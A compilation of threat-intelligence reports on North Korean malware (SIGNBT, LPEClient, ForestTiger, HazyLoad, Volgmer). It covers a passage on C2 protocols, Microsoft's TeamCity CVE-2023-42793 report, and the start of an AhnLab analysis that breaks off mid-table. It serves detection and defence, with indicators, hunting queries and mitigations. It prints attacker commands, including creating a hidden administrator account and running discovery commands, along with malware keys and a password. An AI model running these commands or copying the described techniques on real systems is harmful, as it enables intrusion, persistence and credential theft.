After creating this 24-byte value, the malware generates an additional 24 bytes of random data. These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key. Subsequently, both the resulting value and the 24-byte key are encoded with base64. Finally, these encoded values are combined with either three or seven randomly generated HTTP parameter names. In all future C2 communications, the malware uses a similar structure, making it more challenging to detect and analyze its communications.
 
Structure of HTTP POST data
The malware uses a mechanism to validate the response data received from the C2 server. Specifically, it checks to see if the response data contains a hard-coded HTML script.
1
2
3
4	
During the validation process, the malware decodes the first 12 bytes from the C2 server using base64, replacing the spaces with plus signs to create a seven-character string. This process is then repeated with the next 12 bytes. The first seven characters from each set are then XORed and compared to the “success” string. This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected “success” criterion.
Next, the malware sends HTTP requests with the SIGNBTKE header, and if it receives a “success” message from the C2 server, it activates the getInfo function within the CCBrush class. This function gathers various information about the victim’s computer, such as computer name, product name, OS details, system uptime, CPU information, system locale, time zone, network status, and malware configuration data. After sending this system-specific information, the malware sends another HTTP request with the SIGNBTGC prefix, this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter names.
1
2
3
4
5
6
7	client, output, h, slotname, adk, adf, pi, w, format, url, ea, flash, tt_state, dt, bpp, 
bdt, idt, shv, ptt, saldr, frm, ife, pv, ga_vid, ga_sid, ga_hid, ga_fc, nhd, u_tz, u_his, 
u_java, u_h, u_w, u_ah, u_aw, u_cd, u_nplug, u_nmime, adx, ady, biw, bih, isw, ish, ifk, 
scr_x, scr_y, eid, oid, pvsid, pem, loc, eae, brdim, vis, rsz, abl, pfx, fu, bc, ifi, uci, 
fsb, dtd, atyp, ei, s, t, bl, imn, ima, imad, aftp, adh, conn, ime, imex, imeh, imea, 
imeb, wh, scp, net, mem, sto, sys, rt, zx, su, tb, calp, rui, u, XU, TREX, UID, SID, dr, 
XDR, dt
The data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request. If the decrypted data is “keep”, the malware responds with an “OK” message using the SIGNBTSR prefix, indicating a successful communication. If there are problems, the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication. To summarize, the C2 communication process can be described as follows:
 
C2 communication process
If the delivered data does not equal “keep”, indicating that specific instructions or actions are required, the malware proceeds to invoke the corresponding class and function for backdoor behavior. The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victim’s system. To perform these functions, the malware receives instructions from the C2 server in the form of a class name, function name, and any necessary parameters. It then executes the relevant function embedded in the malware’s codebase.
Class name	Function name
CCBrush	getInfo, testConnect, setSleep, setHibernate, sendConfig, setConfig
CCList	getProcessList, processKill, runFile, runAsUser, injectDll, freeDll
CCComboBox	getDriveList, getFileDir, changeFileTime, secDelete, folderProperty, changeFileName, makeNewFolder
CCButton	startDownload, upFile, selfMemload, scrCapture
CCBitmap	ping, netshAdvfirewall, netstat, reg, sc, whoami, arp, nslookup, systeminfo, ipconfig, net, ver, wmic, deploy, copy
The name of each backdoor command is straightforward, implementing commonly used Windows commands such as ping, netstat, and systeminfo. It’s important to note that the backdoor is capable of implanting an additional payload for auto execution, internally named “deploy”. This backdoor function receives file paths via command-line arguments decrypted with AES. Using this command, SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section above.
Based on the analysis, it is evident that the actor’s initial compromise of the victim involved exploiting vulnerabilities within the software exploit. They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique. Furthermore, the actor used the backdoor capability “deploy” to implant an additional payload for automated execution. This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victim’s system.
LPEClient
Using the comprehensive backdoor as described above, the actor deploys additional malware in the victim’s memory. Notably, these newly delivered malware variants predominantly execute in the system’s memory only, without touching the disk. Based on our telemetry, the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machines.
 
Additional payload delivered by SIGNBT
The LPEClient malware is not new and was first discovered during an investigation of a defense contractor attack in 2020. It is designed to collect victim information and download additional payloads from a remote server to run in memory. Although it has been previously noted in our threat intelligence reports to our customers, recent discoveries indicate that LPEClient has undergone significant evolution. It now employs advanced techniques to improve its stealth and avoid detection, such as disabling user-mode syscall hooking and restoring system library memory sections. This indicates a continued effort by the threat actors to increase the sophistication and effectiveness of their malware.
Connections with other campaigns
One of the malware strains employed in this attack, known as LPEClient, has featured prominently in recent activity attributed to the Lazarus group. This particular malware consistently serves as the initial infection vector, enabling victim profiling and facilitating the delivery of additional payloads. Over an extended period of time, one of these campaigns specifically targeted defense contractors and nuclear engineers. In a recent incident, the threat actor compromised a victim by delivering LPEClient via a Trojanized VNC or Putty client for an intermediate infection. Another campaign targeting the cryptocurrency industry was discovered in July 2023. In this financially motivated campaign, the actor leveraged the Gopuram malware, associated with the 3CX supply chain attack. Interestingly, the actor also used LPEClient malware in this case. Prior to the introduction of the Gopuram cluster, LPEClient was used to deliver the subsequent malware. These three campaigns attributed to Lazarus in 2023 illustrate different initial infection vectors and infection chains, but they consistently relied on LPEClient malware to deliver the final payload.
 
The infection chains of the three campaigns attributed to Lazarus in 2023
Conclusions
The Lazarus group remains a highly active and versatile threat actor in today’s cybersecurity landscape. The threat actor has demonstrated a profound understanding of IT environments, refining their tactics to include exploiting vulnerabilities in high-profile software. This approach allows them to efficiently spread their malware once initial infections are achieved. Moreover, the activities of this notorious actor transcend geographic boundaries and industry sectors. They have targeted various industries, each with distinct objectives and using different tools, tactics and techniques. This underscores their recent and ongoing activity characterized by sophisticated methods and unwavering motivations.
Indicators of Compromise
SIGNBT loader
9cd90dff2d9d56654dbecdcd409e1ef3         %system%\ualapi.dll
88a96f8730b35c7406d57f23bbba734d        %system%\ualapi.dll
54df2984e833ba2854de670cce43b823       %system%\ualapi.dll
Ae00b0f490b122ebab614d98bb2361f7          %system%\ualapi.dll
e6fa116ef2705ecf9677021e5e2f691e
31af3e7fff79bc48a99b8679ea74b589           C:\GoogleD\Coding\JS\Node\winhttp.dll
SIGNBT
9b62352851c9f82157d1d7fcafeb49d3
LPEClient
3a77b5054c36e6812f07366fb70b007d       %systme%\wbem\wbemcomn.dll
E89fa6345d06da32f9c8786b65111928 %ProgramData%\Microsoft\Windows\ServiceSetting\ESENT.dll
File path
C:\GoogleD\Coding\JS\Node\SgrmLpac.exe
C:\GoogleD\Coding\JS\Node\winhttp.dll
C:\Windows\system32\config\systemprofile\appdata\Local\tw-100a-a00-e14d9.tmp
C:\Windows\system32\config\systemprofile\appdata\Local\tw-100b-a00-e14d9.tmp
C:\ProgramData\ntuser.008.dat
C:\ProgramData\ntuser.009.dat
C:\ProgramData\ntuser.001.dat
C:\ProgramData\ntuser.002.dat
C:\ProgramData\Microsoft\Windows\ServiceSetting\ESENT.dll
C2 servers
hxxp://ictm[.]or[.]kr/UPLOAD_file/board/free/edit/index[.]php
hxxp://samwoosystem[.]co[.]kr/board/list/write[.]asp
hxxp://theorigin[.]co[.]kr:443/admin/management/index[.]php
hxxp://ucware[.]net/skins/PHPMailer-master/index[.]php
hxxp://www[.]friendmc[.]com/upload/board/asp20062107[.]asp
hxxp://www[.]hankooktop[.]com/ko/company/info[.]asp
hxxp://www[.]khmcpharm[.]com/Lib/Modules/HtmlEditor/Util/read[.]cer
hxxp://www[.]vietjetairkorea[.]com/INFO/info[.]asp
hxxp://yoohannet[.]kr/min/tmp/process/proc[.]php
hxxps://admin[.]esangedu[.]kr/XPaySample/submit[.]php
hxxps://api[.]shw[.]kr/login_admin/member/login_fail[.]php
hxxps://hicar[.]kalo[.]kr/data/rental/Coupon/include/inc[.]asp
hxxps://hspje[.]com:80/menu6/teacher_qna[.]asp
hxxps://kscmfs[.]or[.]kr/member/handle/log_proc[.]php
hxxps://kstr[.]radiology[.]or[.]kr/upload/schedule/29431_1687715624[.]inc
hxxps://little-pet[.]com/web/board/skin/default/read[.]php
hxxps://mainbiz[.]or[.]kr/SmartEditor2/photo_uploader/popup/edit[.]asp
hxxps://mainbiz[.]or[.]kr/include/common[.]asp
hxxps://new-q-cells[.]com/upload/newsletter/cn/frame[.]php
hxxps://pediatrics[.]or[.]kr/PubReader/build_css[.]php
hxxps://pms[.]nninc[.]co[.]kr/app/content/board/inc_list[.]asp
hxxps://safemotors[.]co[.]kr/daumeditor/pages/template/template[.]asp
hxxps://swt-keystonevalve[.]com/data/editor/index[.]php
hxxps://vnfmal2022[.]com/niabbs5/upload/gongji/index[.]php
hxxps://warevalley[.]com/en/common/include/page_tab[.]asp
hxxps://www[.]blastedlevels[.]com/levels4SqR8/measure[.]asp
hxxps://www[.]droof[.]kr/Board/htmlEdit/PopupWin/Editor[.]asp
hxxps://www[.]friendmc[.]com:80/upload/board/asp20062107[.]asp
hxxps://www[.]hanlasangjo[.]com/editor/pages/page[.]asp
hxxps://www[.]happinesscc[.]com/mobile/include/func[.]asp
hxxps://www[.]healthpro[.]or[.]kr/upload/naver_editor/subview/view[.]inc
hxxps://www[.]medric[.]or[.]kr/Controls/Board/certificate[.]cer
hxxps://www[.]muijae[.]com/daumeditor/pages/template/simple[.]asp
hxxps://www[.]muijae[.]com/daumeditor/pages/template/template[.]asp
hxxps://www[.]nonstopexpress[.]com/community/include/index[.]asp
hxxps://www[.]seoulanesthesia[.]or[.]kr/mail/mail_211230[.]html
hxxps://www[.]seouldementia[.]or[.]kr/_manage/inc/bbs/jiyeuk1_ok[.]asp
hxxps://www[.]siriuskorea[.]co[.]kr/mall/community/bbs_read[.]asp
hxxps://yoohannet[.]kr/min/tmp/process/proc[.]php
MITRE ATT&CK Mapping
Tactic	Techniques
Initial Access	T1189
Execution	T1203
Persistence	T1547.012, T1574.002
Privilege Escalation	T1547.012
Defense Evasion	T1140, T1574.002, T1027.001, T1027.002, T1620
Credential Access	T1003.001
Discovery	T1057, T1082, T1083
Collection	T1113
Command and Control	T1071.001, T1132.002, T1573.001
Exfiltration	T1041







•	Research
•	Threat intelligence
•	Microsoft Defender XDR
•	Vulnerabilities and exploits
 
10 min read
Multiple North Korean threat actors exploiting the TeamCity CVE-2023-42793 vulnerability
•	By Microsoft Threat Intelligence
October 18, 2023
•	
•	
•	
•	Endpoint security
•	Microsoft Defender
•	Microsoft Defender for Endpoint
•	
•	
•	
•	
•	
•	
•	
•	
more
Since early October 2023, Microsoft has observed two North Korean nation-state threat actors – Diamond Sleet and Onyx Sleet – exploiting CVE-2023-42793, a remote-code execution vulnerability affecting multiple versions of JetBrains TeamCity server. TeamCity is a continuous integration/continuous deployment (CI/CD) application used by organizations for DevOps and other software development activities.
In past operations, Diamond Sleet and other North Korean threat actors have successfully carried out software supply chain attacks by infiltrating build environments. Given this, Microsoft assesses that this activity poses a particularly high risk to organizations who are affected. JetBrains has released an update to address this vulnerability and has developed a mitigation for users who are unable to update to the latest software version.
While the two threat actors are exploiting the same vulnerability, Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitation.
Based on the profile of victim organizations affected by these intrusions, Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers. However, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments.
As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised and provides them with the information they need to secure their environments.
Who are Diamond Sleet and Onyx Sleet?
Diamond Sleet (ZINC) is a North Korean nation-state threat actor that prioritizes espionage, data theft, financial gain, and network destruction. The actor typically targets media, IT services, and defense-related entities around the world. Microsoft reported on Diamond Sleet’s targeting of security researchers in January 2021 and the actor’s weaponizing of open-source software in September 2022. In August 2023, Diamond Sleet conducted a software supply chain compromise of a German software provider.
Onyx Sleet (PLUTONIUM) is a North Korean nation-state threat actor that primarily targets defense and IT services organizations in South Korea, the United States, and India. Onyx Sleet employs a robust set of tools that they have developed to establish persistent access to victim environments and remain undetected. The actor frequently exploits N-day vulnerabilities as a means of gaining initial access to targeted organizations.
Diamond Sleet attack path 1: Deployment of ForestTiger backdoor
Following the successful compromise of TeamCity servers, Diamond Sleet utilizes PowerShell to download two payloads from legitimate infrastructure previously compromised by the threat actor. These two payloads, Forest64.exe and 4800-84DC-063A6A41C5C are stored in the C:\ProgramData directory.
When launched, Forest64.exe checks for the presence of the file named 4800-84DC-063A6A41C5C, then reads and decrypts the contents of that file using embedded, statically assigned key of ‘uTYNkfKxHiZrx3KJ’:
c:\ProgramData\Forest64.exe  uTYNkfKxHiZrx3KJ
Interestingly, this same value is specified as a parameter when the malware is invoked, but we did not see it utilized during our analysis. The same value and configuration name was also referenced in historical activity reported by Kaspersky’s Securelist on this malware, dubbed ForestTiger.
The decrypted content of 4800-84DC-063A6A41C5C is the configuration file for the malware, which contains additional parameters, such as the infrastructure used by the backdoor for command and control (C2). Microsoft observed Diamond Sleet using infrastructure previously compromised by the actor for C2.
Microsoft observed Forest64.exe then creating a scheduled task named Windows TeamCity Settings User Interface so it runs every time the system starts with the above referenced command parameter “uTYNkfKxHiZrx3KJ”. Microsoft also observed Diamond Sleet leveraging the ForestTiger backdoor to dump credentials via the LSASS memory. Microsoft Defender Antivirus detects this malware as ForestTiger.
 Figure 1. Diamond Sleet attack chain 1 using ForestTiger backdoor
Diamond Sleet attack path 2: Deploying payloads for use in DLL search-order hijacking attacks
Diamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure. This malicious DLL is then staged in C:\ProgramData\ alongside a legitimate .exe file to carry out DLL search-order hijacking. Microsoft has observed these malicious DLL and legitimate EXE combinations used by the actor:
Malicious DLL name	Legitimate binary name
DSROLE.dll	wsmprovhost.exe
Version.dll	clip.exe
DSROLE.dll attack chain
When DSROLE.dll is loaded by wsmprovhost.exe, the DLL initiates a thread that enumerates and attempts to process files that exist in the same executing directory as the DLL. The first four bytes of candidate files are read and signify the size of the remaining buffer to read. Once the remaining data is read back, the bytes are reversed to reveal an executable payload that is staged in memory. The expected PE file should be a DLL with the specific export named ‘StartAction’. The address of this export is resolved and then launched in memory.
While the functionality of DSROLE.dll is ultimately decided by whatever payloads it deobfuscates and launches, Microsoft has observed the DLL being used to launch wksprt.exe, which communicates with C2 domains. Microsoft Defender Antivirus detects DSROLE.dll using the family name RollSling.
Version.dll attack chain
When loaded by clip.exe, Version.dll loads and decrypts the contents of readme.md, a file  downloaded alongside Version.dll from attacker-compromised infrastructure. The file readme.md contains data that is used as a multibyte XOR key to decrypt position-independent code (PIC) embedded in Version.dll. This PIC loads and launches the final-stage remote access trojan (RAT).
 Figure 2. Composition of readme.md used as multibyte XOR key by Version.dll Figure 3. Application of XOR key to expose next-stage code block Figure 4. Carving out embedded PE from code block
Once loaded in memory, the second-stage executable decrypts an embedded configuration file containing several URLs used by the malware for command and control. Shortly after the malware beacons to the callback URL, Microsoft has observed a separate process iexpress.exe created and communicating with other C2 domains. Microsoft Defender Antivirus detects Version.dll using the family name FeedLoad.
 Figure 5. Diamond Sleet attack chain 2 using DLL search order hijacking
After successful compromise, Microsoft observed Diamond Sleet dumping credentials via the LSASS memory.
In some cases, Microsoft observed Diamond Sleet intrusions that utilized tools and techniques from both paths 1 and 2.
Onyx Sleet attack path: User account creation, system discovery, and payload deployment
Following successful exploitation using the TeamCity exploit, Onyx Sleet creates a new user account on compromised systems. This account, named krtbgt, is likely intended to impersonate the legitimate Windows account name KRBTGT, the Kerberos Ticket Granting Ticket. After creating the account, the threat actor adds it to the Local Administrators Group through net use:
net  localgroup administrators krtbgt /add
The threat actor also runs several system discovery commands on compromised systems, including:
net localgroup 'Remote Desktop Users’
net localgroup Administrators
cmd.exe "/c tasklist | findstr Sec"
cmd.exe "/c whoami"
cmd.exe "/c netstat -nabp tcp"
cmd.exe "/c ipconfig /all"
cmd.exe "/c systeminfo"
Next, the threat actor deploys a unique payload to compromised systems by downloading it from attacker-controlled infrastructure via PowerShell. Microsoft observed these file paths for the unique payload:
•	C:\Windows\Temp\temp.exe
•	C:\Windows\ADFS\bg\inetmgr.exe
This payload, when launched, loads and decrypts an embedded PE resource. This decrypted payload is then loaded into memory and launched directly. The inner payload is a proxy tool that helps establish a persistent connection between the compromised host and attacker-controlled infrastructure. Microsoft Defender Antivirus detects this proxy tool as HazyLoad.
Microsoft also observed the following post-compromise tools and techniques leveraged in this attack path:
•	Using the attacker-controlled krtbgt account to sign into the compromised device via remote desktop protocol (RDP)
•	Stopping the TeamCity service, likely in an attempt to prevent access by other threat actors
•	Dumping credentials via the LSASS memory
•	Deploying tools to retrieve credentials and other data stored by browsers
 Figure 6. Onyx Sleet attack chain with user account creation
Recommended mitigation actions
Microsoft recommends the following mitigations to reduce the impact of this threat.
•	Apply the update or mitigations released by JetBrains to address CVE-2023-42793.
•	Use the included indicators of compromise to investigate whether they exist in your environment and assess for potential intrusion.
•	Block in-bound traffic from IPs specified in the IOC table.
•	Use Microsoft Defender Antivirus to protect from this threat. Turn on cloud-delivered protection and automatic sample submission. These capabilities use artificial intelligence and machine learning to quickly identify and stop new and unknown threats.
•	Take immediate action to address malicious activity on the impacted device. If malicious code has been launched, the attacker has likely taken complete control of the device. Immediately isolate the system and perform a reset of credentials and tokens.
•	Investigate the device timeline for indications of lateral movement activities using one of the compromised accounts. Check for additional tools that attackers might have dropped to enable credential access, lateral movement, and other attack activities.
•	Ensure that “Safe DLL Search Mode” is set.
•	Turn on the following attack surface reduction rule:
o	Block executable files from running unless they meet a prevalence, age, or trusted list criterion
Detections
Microsoft 365 Defender
Microsoft 365 Defender is becoming Microsoft Defender XDR. Learn more.
Microsoft Defender Vulnerability Management
Microsoft Defender Vulnerability Management surfaces devices that may be affected by the CVE-2023-42793 vulnerability leveraged in these attacks.
Microsoft Defender Antivirus
Microsoft Defender Antivirus customers should look for the following family names for activity related to these attacks:
•	ForestTiger
•	RollSling
•	FeedLoad
•	HazyLoad
Microsoft Defender for Endpoint
The following Microsoft Defender for Endpoint alerts could indicate activity associated with this threat. These alerts, however, can be triggered by unrelated threat activity.
•	Diamond Sleet Actor activity detected
•	Onyx Sleet Actor activity detected
•	Possible exploitation of JetBrains TeamCity vulnerability
•	Suspicious behavior by cmd.exe was observed
•	Suspicious DLL loaded by an application
•	Suspicious PowerShell download or encoded command execution
•	Possible lateral movement involving suspicious file
•	A script with suspicious content was observed
•	Suspicious scheduled task
Hunting queries
Microsoft 365 Defender
Command and control using iexpress.exe or wksprt.exe
DeviceNetworkEvents
| where (InitiatingProcessFileName =~ "wksprt.exe" and InitiatingProcessCommandLine == "wksprt.exe") 
or (InitiatingProcessFileName =~ "iexpress.exe" and InitiatingProcessCommandLine == "iexpress.exe")
Search order hijack using Wsmprovhost.exe and DSROLE.dll
DeviceImageLoadEvents
| where InitiatingProcessFileName =~ "wsmprovhost.exe"
| where FileName =~ "DSROLE.dll"
| where not(FolderPath has_any("system32", "syswow64"))
Search order hijack using clip.exe and Version.dll
DeviceImageLoadEvents
| where InitiatingProcessFileName =~ "clip.exe"
| where FileName in~("version.dll")
| where not(FolderPath has_any("system32", "syswow64", "program files", "windows defender\\platform", "winsxs", "platform",
"trend micro"))
Microsoft Sentinel
Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
Microsoft Sentinel also has a range of detection and threat hunting content that customers can use to detect the post exploitation activity detailed in this blog in addition to Microsoft 365 Defender detections list above.  
•	PowerShell downloads
•	Dumping LSASS Process into a File
•	Anomalous Account Creation
•	RDP Rare Connection
•	Anomalous RDP Activity
Indicators of compromise (IOCs)
The list below provides IOCs observed during our investigation. We encourage our customers to investigate these indicators in their environments and implement detections and protections to identify past related activity and prevent future attacks against their systems.
Diamond Sleet path 1
Indicator	Type	Description
C:\ProgramData\Forest64.exe                                                              	File path	File path of ForestTiger binary
e06f29dccfe90ae80812c2357171b5c48fba189ae103d28e972067b107e58795	SHA-256	Hash of Forest64.exe
0be1908566efb9d23a98797884f2827de040e4cedb642b60ed66e208715ed4aa	SHA-256	Hash of Forest64.exe
C:\ProgramData\4800-84DC-063A6A41C5C	File path	ForestTiger configuration file
hxxp://www.bandarpowder[.]com/public/assets/img/cfg.png	URL	Staging URL for 4800-84DC-063A6A41C5C (compromised domain)
hxxps://www.bandarpowder[.]com/public/assets/img/cfg.png	URL	Staging URL for 4800-84DC-063A6A41C5C (compromised domain)
hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/cfg.png	URL	Staging URL for 4800-84DC-063A6A41C5C (compromised domain)
hxxp://www.bandarpowder[.]com/public/assets/img/user64.png	URL	Staging URL for Forest64.exe (compromised domain)
hxxps://www.bandarpowder[.]com/public/assets/img/user64.png	URL	Staging URL for Forest64.exe (compromised domain)
hxxp://www.aeon-petro[.]com/wcms/plugins/addition_contents/user64.png	URL	Staging URL for Forest64.exe (compromised domain)
Diamond Sleet path 2
Indicator	Type	Description
C:\ProgramData\DSROLE.dll	File path	File path of RollSling binary  
d9add2bfdfebfa235575687de356f0cefb3e4c55964c4cb8bfdcdc58294eeaca	SHA-256	Hash of DSROLE.dll
C:\ProgramData\Version.dll	File path  	File path of FeedLoad binary.
f251144f7ad0be0045034a1fc33fb896e8c32874e0b05869ff5783e14c062486	SHA-256	Hash of Version.dll
C:\ProgramData\readme.md	File path  	Used as a multibyte XOR key for FeedLoad Next Stage
fa7f6ac04ec118dd807c1377599f9d369096c6d8fb1ed24ac7a6ec0e817eaab6	SHA-256	Hash of Readme.md
C:\ProgramData\wsmprovhost.exe	File path	Legitimate Windows binary is copied to this directory for DLL search-order hijacking
C:\ProgramData\clip.exe	File path	Legitimate Windows binary is copied to this directory for DLL search-order hijacking
dersmarketim[.]com	Domain	C2 domain (compromised domain)
olidhealth[.]com	Domain	C2 domain (compromised domain)
galerielamy[.]com	Domain	C2 domain (compromised domain)
3dkit[.]org	Domain	C2 domain (compromised domain)
hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feed.zip	URL	Staging URL for Version.dll (compromised domain)
hxxp://www.mge[.]sn/themes/classic/modules/ps_rssfeed/feedmd.zip	URL	Staging URL for readme.md (compromised domain)
hxxps://vadtalmandir[.]org/admin/ckeditor/plugins/icontact/about.php	URL	Callback URL from second-stage PE (compromised domain)
hxxps://commune-fraita[.]ma/wp-content/plugins/wp-contact/contact.php	URL	Callback URL from second-stage PE (compromised domain)
Onyx Sleet path
Indicator	Type	Description
C:\Windows\Temp\temp.exe	File path	File path for HazyLoad binary
C:\Windows\ADFS\bg\inetmgr.exe	File path	File path for HazyLoad binary
000752074544950ae9020a35ccd77de277f1cd5026b4b9559279dc3b86965eee	SHA-256	Hash of proxy tool loader
hxxp://147.78.149[.]201:9090/imgr.ico	URL	Staging URL for HazyLoad binary (compromised infrastructure)
hxxp://162.19.71[.]175:7443/bottom.gif	URL	Staging URL for HazyLoad binary (compromised infrastructure)
NOTE: These indicators should not be considered exhaustive for this observed activity.







Analysis Report on Lazarus Threat Group’s Volgmer and Scout Malware
Overview
1. Analysis of Volgmer Backdoor
…. 1.1. Initial Version of Volgmer
…….. 1.1.1. Analysis of Volgmer Dropper
…….. 1.1.2. Analysis of Volgmer Backdoor
…. 1.2. Later Version of Volgmer
…….. 1.2.1. Analysis of Volgmer Backdoor
2. Analysis of Scout Downloader
…. 2.1. Droppers (Volgmer, Scout)
…. 2.2. Analysis of Scout Downloader
…….. 2.2.1. Scout Downloader v1
…….. 2.2.2. Scout Downloader v2
3. Conclusion
Table of Contents
The seemingly state-sponsored Lazarus threat group has records of activity that date back to 2009. In the early days, their activities were mostly focused on Korea, but since 2016, the group has been attacking the defense, advanced technology, and finance sectors worldwide. The Lazarus group usually employed spear phishing and supply chain attacks, usually disguising the malware as legitimate programs in their attack process. [1]
For the last few years, the group launched watering hole attacks to attack multiple Korean enterprises and organizations in the fields of defense, satellite, software, and media. Their method for initial access involved the exploitation of a security vulnerability of a Korean financial security certification software. [2] Even after initial access, the threat actor exploited vulnerabilities in web security software or enterprise asset management programs during lateral movement. [3] The Lazarus group attacks not only ordinary PCs but also server systems for the purpose of using them as malware distribution or C&C servers. [4] [5]
Because the Lazarus threat group has been active since a long time ago, there are many attack cases and various malware strains are used in each case. In particular, there is also a wide variety of backdoors used for controlling the infected system after initial access. AhnLab Security Emergency response Center (ASEC) is continuously tracking and analyzing attacks by the Lazarus group, and in this post, we will analyze Volgmer and Scout, the two major malware strains used in their attacks.
Volgmer is a backdoor that has been used by the Lazarus threat group since 2014. Volgmer, which usually runs by being registered as a service, is installed with a name that disguises it as a legitimate file. It differs from other malware in the fact that it encrypts and saves the configuration data in the registry key “HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security”. ASEC identified that since 2014, Volgmer underwent many changes and has been used in attacks until about 2021. We also confirmed that since 2022, a downloader named Scout has been used in attacks instead of Volgmer. The basic operating mechanism of Scout is similar to the previous one, with the only difference in the actual features. The payload it downloads is presumed to be a backdoor for controlling the infected system.
 Figure 1. PDB information of the Scout downloader
Scout has been in use for attacks since around 2022. While there are many instances where the specific attack cases could not be confirmed, there are cases where the initial access process was identified. For example, it was found alongside other pieces of malware in the attack case mentioned above, where a security vulnerability of a Korean financial security certification software was exploited. Much like the Lazarus group’s ordinary activities, its targets include multiple Korean enterprises and organizations in the defense, manufacturing, ICT, and financial sectors. The threat actor used this malware to control the infected systems. There has also been a case of BYOVD (Bring Your Own Vulnerable Driver), where the threat actor leveraged a vulnerable driver module of a hardware supplier to disable security products. [6] [7]
This blog post will analyze the initial version of Volgmer backdoor that was identified first and the later version that began to be used in attacks in around 2017. Afterward, we will analyze the Scout downloader and also cover the dropper that was used to install Scout.

1. Analysis of Volgmer Backdoor
The oldest record regarding Volgmer is presumed to be the “Trojan.Volgmer” malware analysis page published by Symantec in 2014. [8] (link currently unavailable) Volgmer continued to be used in later attacks, and in 2017, CISA (Cybersecurity and Infrastructure Security Agency) of the U.S. also mentioned Volgmer when they disclosed the malware used by the Lazarus group. [9] (link currently unavailable) According to AhnLab’s ASD logs, the Volgmer malware type disclosed by Symantec was detected from at least 2014 to 2015, and there are records of a similar variant being used in attacks until 2016.
An updated version of Volgmer was found to have been used since 2017, and there were records of its use until around 2021. As determined by the comparison of the C&C command routines despite a few differences, this type can be considered as the same type as the backdoor used in the attack case shared by Kaspersky in 2021 where the backdoor was disguised as a DeFi application. [10] There were no other cases of Volgmer being used in attacks after the emergence of the Scout downloader around 2022.
Here we will analyze the initial version of Volgmer in the past before analyzing the later version of Volgmer used between 2017 and 2020. The initial version of Volgmer will be briefly analyzed even if it is an old malware strain, since there are many functional similarities with other malware that came after it. Subsequently, the later version of Volgmer will be analyzed; while this type has a different C&C command routine, its flow of operation is notably almost identical to the past version of Volgmer.

1.1. Initial Version of Volgmer
1.1.1. ANALYSIS OF VOLGMER DROPPER
Because Volgmer is a DLL-type backdoor, it needs malware that installs it. A dropper was identified alongside the initial version of Volgmer, and this dropper installs Volgmer by creating a password-protected compressed version in the resource area before registering it as a service. The dropper also checks the number of arguments, recognizes Korean operating environments, and even checks the version of Windows operating environments, and if these do not match pre-configured conditions, it either displays a message box or deletes itself. A batch file is used for self-deletion, and the use of the file name “pdm.bat” is notable.
The encrypted configuration data is decrypted during execution. This contains the registry key which will include the configuration data with the C&C server addresses, the string used to register the malware as a service, and the file “pdm.bate” to be used for self-deletion. The 0x10 byte-sized key used for decryption is still used by the malware from the Andariel group, a subsidiary group of Lazarus. [11]
•	Key: 74 61 51 04 77 32 54 45 89 95 12 52 12 02 32 73
One of the characteristics of Volgmer is that it follows a certain logic to randomly generate strings for the name of the Volgmer DLL file to be created, as well as the name and description of the service to be registered. These strings are created by combining the following strings contained in the decrypted configuration data.
•	String A: svc, mgmt, mgr, enum, app, bg, c, d, ex, f, g, h, i, k, l, m, net, o, p, q, rm, sec, ti, up, vol, win, dc, ud
•	String B: Service, Management, Manager, Enumerator, Application, Background, Control, Desktop, Extension, Function, Group, Host, Intelligent, Key, Layer, Multimedia, Network, Operation, Portable, Quality, Remote, Security, TCP/IP, User Profile, Volume, Windows, Device, Update
For example, the file name is a combination of four selections from the “String A” list, resulting in names such as “hlrmenum.dll”. Likewise, service-related items are created by combining four selections from the “String B” list, as follows.
•	Service name: “[Host Layer Remote Enumerator]”
•	Service description: “The [Host Layer Remote Enumerator] is an essential service for management of Windows System. If the service is stopped or disabled, Windows will be able to damaged seriously.”
•	Service DLL path: “C:\Windows\system32{hlrmenum}.dll”
The Volgmer dropper decompresses “MYRES” in the resource area to obtain the Volgmer DLL and configuration files. These files are compressed with the ZIP compression algorithm and password-protected with the following password.
•	Password for the compressed file: “!1234567890 dghtdhtrhgfjnui$%^^&fdt”
 Figure 2. Password-protected compressed DLL and configuration file in the resource area
After creating the Volgmer DLL in the path %SystemDirectory%, the dropper sets the time configuration information to be the same as the Notepad (notepad.exe) file. This timestomping is one of the major anti-forensic techniques employed for the purpose of evading timeline analysis. Besides the timestomping technique, the Lazarus group uses a variety of anti-forensic techniques such as file deletion and data concealment in their attack process, and this trend continues to this day. [12]
Before being written into the registry key, the decompressed configuration file is encrypted with the same method as the algorithm used for decrypting the configuration data. This data includes C&C server addresses and is later read, decrypted, and used by Volgmer. After these processes are complete, it uses the generated service configuration data to register Volgmer as a service and executes it.
•	Registry Key – 1: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / 125463f3-2a9c-bdf0-d890-5a98b08d8898
•	Registry Key – 2: HKLM\SYSTEM\CurrentControlSet\Control\WMI\Security / f0012345-2a9c-bdf8-345d-345d67b542a1

1.1.2. ANALYSIS OF VOLGMER BACKDOOR
Volgmer, running as a service, decrypts the registry value above to obtain the configuration data. As shown below, the configuration data consists of the signature string “cgi_config”, the ID, and C&C server addresses. Additionally, the ID value is NULL when the dropper is generated, but afterward, Volgmer uses the infected system’s hardware information to create an ID value.
Offset	Size	Data
